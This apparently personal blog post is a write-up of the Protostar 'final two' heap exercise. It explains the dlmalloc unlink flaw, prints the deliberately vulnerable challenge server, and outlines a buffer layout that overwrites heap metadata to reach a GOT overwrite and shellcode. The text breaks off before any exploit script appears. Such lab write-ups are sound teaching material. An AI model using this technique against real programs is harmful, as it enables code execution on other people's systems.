<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="IntroductionThis post will look into solving final two. An exercise that uses a bug in Doug Lea Malloc to allow abitrary code execution. More information about the bug can be found here.  Vulnerabilit">
<meta property="og:type" content="article">
<meta property="og:title" content="Binary Exploitation - Protostar - Heap">
<meta property="og:url" content="https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/index.html">
<meta property="og:site_name" content="Winston&#39;s Blog">
<meta property="og:description" content="IntroductionThis post will look into solving final two. An exercise that uses a bug in Doug Lea Malloc to allow abitrary code execution. More information about the bug can be found here.  Vulnerabilit">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-01-06T12:23:23.000Z">
<meta property="article:modified_time" content="2020-04-28T14:09:39.116Z">
<meta property="article:author" content="Winston Zhao">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
          
        
    
    <!-- title -->
    <title>Binary Exploitation - Protostar - Heap</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/01/16/modern-stack-buffer-overflow/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/01/03/binary-exploitation-protostar-format-string/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&text=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&is_video=false&description=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Heap&body=Check out this article: https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&title=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&name=Binary Exploitation - Protostar - Heap&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2020/01/06/binary-exploitation-protostar-heap/&t=Binary Exploitation - Protostar - Heap" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge"><span class="toc-number">3.</span> <span class="toc-text">Challenge</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Binary Exploitation - Protostar - Heap
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Winston's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-01-06T12:23:23.000Z" itemprop="datePublished">2020-01-06</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Security/" rel="tag">Security</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This post will look into solving <a href="https://exploit.education/protostar/final-two/" target="_blank" rel="noopener">final two</a>. An exercise that uses a bug in <a href="http://gee.cs.oswego.edu/dl/html/malloc.html" target="_blank" rel="noopener">Doug Lea Malloc</a> to allow abitrary code execution. More information about the bug can be found <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html#ss11.3" target="_blank" rel="noopener">here</a>. </p>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>To understand the vulnerability, you should know that the way that <code>malloc</code> works is that it keeps track of the “chunks” on the heap that are currently being used (caused by a call to <code>malloc</code>) and it also keeps track of the free space in a doubly linked list. This vulnerability comes from when a block is <code>free</code>‘d. `</p>
<p>When <code>free</code> is called on a memory chunk, the <code>malloc</code>, the implementation will attempt consolidate the free chunks by combining the chunk being <code>free</code>‘d with surrounding free chunks (that is either next or previous chunks).</p>
<p>Before we start looking at the code, it’s probably worth mentioning that I’m using <a href="https://github.com/ennorehling/dlmalloc/blob/master/malloc.c" target="_blank" rel="noopener">this</a>  version of the <code>dlmalloc</code> that I found on Github as a reference.</p>
<p>Let’s first take a look at the chunk data structure.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free). */</span></span><br><span class="line">INTERNAL_SIZE_T size; <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>We can see that a chunk will hold the size of the current chunk and the size of the previous chunk. If the chunk is not being used, then it will also hold pointers to the forward and backward chunks.</p>
<p>Now let’s look at the free function on line #3714.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* free(0) has no effect */</span></span><br><span class="line"><span class="keyword">if</span> (mem != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// malloc...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This is pretty self explanatory.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = mem2chunk(mem);</span><br><span class="line">size = chunksize(p);</span><br><span class="line">check_inuse_chunk(p);</span><br></pre></td></tr></table></figure>
<p>Let’s how <code>mem2chunk</code> is defined:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br></pre></td></tr></table></figure>
<p>This takes the memory that is passed in by the user and returns the address of the chunk including the metadata.</p>
<p>Now let’s see how <code>chunksize</code> is defined:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  IS_MMAPPED  0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  SIZE_BITS (PREV_INUSE|IS_MMAPPED)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure>
<p>So, essentially the <code>chunksize</code> is just the <code>size</code> member of the struct with the last two bits zeroed out. Additionally, we can see that the second to last it is used for <code>IS_MMAPPED</code> and the last bit is used for <code>PREV_INUSE</code>.</p>
<p>The last line <code>check_inuse_chunk</code> will trigger an error if the chunk is not in use.</p>
<p>The next block is for handling for fast bins, which are small memory chunks that are handled differently (and doesn’t really concern us).</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((CHUNK_SIZE_T)(size) &lt;= (CHUNK_SIZE_T)(av-&gt;max_fast) &#123;</span><br><span class="line"><span class="comment">// handle fastbin...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Now, we check if we need to attempt to consolidate the previous/next blocks, depending on whether the current chunk is <code>mmapped</code>.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>  <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"><span class="comment">// handle consolidation...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Essentially, if the chunk is not <code>mmapped</code> then we want to consolidate the chunk. The bug is in the consolidation code, so this is important.</p>
<p>Let’s see what we do at the start of the consolidation:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_anychunks(av);</span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  chunk_at_offset(p, s) ((mchunkptr)(((char*)(p)) + (s)))</span></span><br></pre></td></tr></table></figure>
<p><code>set_anychunks</code> just let’s the <code>malloc</code> state know that there are some free chunks.</p>
<p>The rest is pretty self explanatory, we just get the next chunk and also the size of that chunk.</p>
<p>We first check if we should consolidate backwards, this may be useful occasionally, but not nearly as often as forward consolidation (which comes next).  This is due to the fact usually with heap overflows we can control the metadata for the “next” chunk, so it is easier to use. </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; </span><br><span class="line">	<span class="comment">// consolidate backwards...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Without further ado, let’s a look at the forward consolidation.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s) (((mchunkptr)(((char*)(p)) + (s)))-&gt;size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	<span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">	set_head(nextchunk, nextsize);</span><br><span class="line">		<span class="comment">/* consolidate forward */</span></span><br><span class="line">		<span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">		unlink(nextchunk, bck, fwd);</span><br><span class="line">		size += nextsize;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// connect chunk with the rest of the linked list of unsorted chunks...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// basically finished with free()</span></span><br></pre></td></tr></table></figure>

<p>Essentially, we check that the “next chunk” is not in use, and if this is true when we go ahead and <code>unlink</code>.  Now let’s a take a look at <code>unlink</code>:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123; \</span></span><br><span class="line">FD = P-&gt;fd; \</span><br><span class="line">BK = P-&gt;bk; \</span><br><span class="line">FD-&gt;bk = BK; \</span><br><span class="line">BK-&gt;fd = FD; \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>You can see that what unlink does, is basically “combines” a chunk with the one “previous chunk”. It does this by writing to the backward chunk, saying that it’s new forward chunk, instead of the current chunk, is now the forward chunk of the current chunk. Also, it writes to the forward chunk, that the new backward chunk has changed from the current chunk to the current chunk’s backward chunk.</p>
<p>There exists a vulnerability here, in that if there exists a way for us to control the heap metadata (via a buffer overflow), then we can control the forward and backward pointers of a chunk that will be <code>free</code>‘d and thus choose locations we would like <code>unlink</code> to write to.</p>
<p>It should be noted that with any write we attempt to do, another value will be written back.</p>
<p>So, to reiterate the chunk being <code>free</code>‘d needs to have the following (for forward consolidation):</p>
<ul>
<li>To be larger than the default <code>fastbin</code> size (80 bytes).</li>
<li>To have the <code>IS_MMAPPED</code> bit not set.</li>
<li>To have <code>PREV_INUSE</code> bit set.</li>
<li>To have a <code>next_chunk</code> that has a <code>next_chunk</code> that has <code>PREV_INUSE</code> bit set.</li>
<li>Set up the <code>next_chunk</code> with forward and backward pointers that we want to write to (with the offsets in mind).</li>
</ul>
<p>This should allow us to have an arbitrary write (which will go into the GOT) and allow us to redirect code execution to somewhere we can control (the heap) to execute shell code.</p>
<h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p>Let’s take a look at the source code for the challenge:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/malloc.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2993</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQSZ 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_path</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *start;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Work out old software bug</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  p = rindex(buf, <span class="string">'/'</span>);</span><br><span class="line">  l = <span class="built_in">strlen</span>(p);</span><br><span class="line">  <span class="keyword">if</span>(p) &#123;</span><br><span class="line">      start = <span class="built_in">strstr</span>(buf, <span class="string">"ROOT"</span>);</span><br><span class="line">      <span class="keyword">if</span>(start) &#123;</span><br><span class="line">          <span class="keyword">while</span>(*start != <span class="string">'/'</span>) start--;</span><br><span class="line">          memmove(start, p, l);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_requests</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buf;</span><br><span class="line">  <span class="keyword">char</span> *destroylist[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">int</span> dll;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  dll = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(dll &gt;= <span class="number">255</span>) <span class="keyword">break</span>;</span><br><span class="line">      buf = <span class="built_in">calloc</span>(REQSZ, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">read</span>(fd, buf, REQSZ) != REQSZ) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf, <span class="string">"FSRD"</span>, <span class="number">4</span>) != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">      check_path(buf + <span class="number">4</span>);     </span><br><span class="line">      destroylist[dll] = buf;</span><br><span class="line">      dll++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; dll; i++) &#123;</span><br><span class="line">                <span class="built_in">write</span>(fd, <span class="string">"Process OK\n"</span>, <span class="built_in">strlen</span>(<span class="string">"Process OK\n"</span>));</span><br><span class="line">      <span class="built_in">free</span>(destroylist[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line">  get_requests(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Should be noted, that I’ve modified the code from the exploit exercises websites, since I believe there were some mistakes with it.</p>
<p>There’s a while loop that continuously reads characters from the connection and will eventually free the characters that are stored. </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(dll &gt;= <span class="number">255</span>) <span class="keyword">break</span>;</span><br><span class="line">    buf = <span class="built_in">calloc</span>(REQSZ, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(read(fd, buf, REQSZ) != REQSZ) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf, <span class="string">"FSRD"</span>, <span class="number">4</span>) != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    check_path(buf + <span class="number">4</span>);     </span><br><span class="line">    destroylist[dll] = buf;</span><br><span class="line">    dll++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It should be noted that the amount of characters that are read must be <code>REQSZ</code>, which is 128.<br>Additionally, the first four characters must be <code>FSRD</code>.<br>When we want to stop the connection, we can simply just send a message that doesn’t fulfill these categories.  Stopping the connection will also cause all the strings in the <code>destroylist</code>  to be <code>free</code>‘d (which is where the exploit is).</p>
<p>Let’s take a look at the <code>check_path</code> function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_path</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *start;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line">  p = rindex(buf, <span class="string">'/'</span>);</span><br><span class="line">  l = <span class="built_in">strlen</span>(p);</span><br><span class="line">  <span class="keyword">if</span>(p) &#123;</span><br><span class="line">      start = <span class="built_in">strstr</span>(buf, <span class="string">"ROOT"</span>);</span><br><span class="line">      <span class="keyword">if</span>(start) &#123;</span><br><span class="line">          <span class="keyword">while</span>(*start != <span class="string">'/'</span>) start--;</span><br><span class="line">          memmove(start, p, l);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We first find the last occurrence of <code>&#39;/&#39;</code> and store it in <code>p</code>.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = rindex(buf, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>

<p>Then, we get the length of characters in the buffer after <code>&#39;/&#39;</code>.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">strlen</span>(p);</span><br></pre></td></tr></table></figure>

<p>If the call to <code>rindex</code> was successful then we will find the first occurrence of the substring <code>ROOT</code>  and store it in <code>start</code>.</p>
<p>If we’re able to find <code>ROOT</code>, we will attempt to find the previous occurrence of <code>&#39;/&#39;</code> .</p>
<p>We do this by just going backwards from from <code>ROOT</code> and find the previous <code>&#39;/&#39;</code>.</p>
<p>We then copy everything from after the last <code>&#39;/&#39;</code> stored in <code>p</code> to the previous <code>&#39;/&#39;</code> before <code>ROOT</code>.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p)  &#123;</span><br><span class="line">	  start =  <span class="built_in">strstr</span>(buf,  <span class="string">"ROOT"</span>)</span><br><span class="line">      <span class="keyword">if</span>(start) &#123;</span><br><span class="line">          <span class="keyword">while</span>(*start != <span class="string">'/'</span>) start--;</span><br><span class="line">          memmove(start, p, l);</span><br><span class="line">      &#125;</span><br><span class="line">&#125; <span class="comment">// function ends</span></span><br></pre></td></tr></table></figure>

<p>To better illustrate this:<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ROOT_FILLER_&#x2F;HELLO</span><br></pre></td></tr></table></figure><br>turns into this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;HELLOILLER_&#x2F;HELLO</span><br></pre></td></tr></table></figure>
<p> The exploit is that to find the  <code>&#39;/&#39;</code> before <code>ROOT</code>, instead of using <code>index</code>, we decrement  <code>start</code> , this could actually be before the buffer starts, and therefore could be part of the previous buffer. In between the previous buffer and the current buffer should be heap metadata that we can overwrite using the memory.</p>
<p>We could set up the heap like the following:</p>
<ul>
<li>First we place a <code>&#39;/&#39;</code>  at the end of the first buffer, the <code>...</code> should be some text that pads the total message size to 128.<br><code>FSRD.../</code></li>
<li>Next, we can set up the second buffer such that <code>ROOT</code> appears before any <code>&#39;/&#39;</code>s. Then we have a <code>&#39;/&#39;</code> after the <code>ROOT</code>, which is directly followed by the bytes that we wish to overwrite the heap metadata with.<br><code>FSRDROOT/NEW_HEAP_METADATA...</code></li>
<li>This means that before <code>check_path</code> is called on the the heap will look like this:<br><code>FSRD.../ HEAP_METADATA FSRDROOT/NEW_HEAP_METADATA</code></li>
<li>The <code>check_path</code> call, the <code>NEW_HEAP_METADATA</code> will overwrite the <code>HEAP_METADATA</code>.</li>
</ul>
<p>Let’s try get a simple script set up that will overwrite the heap metadata:</p>
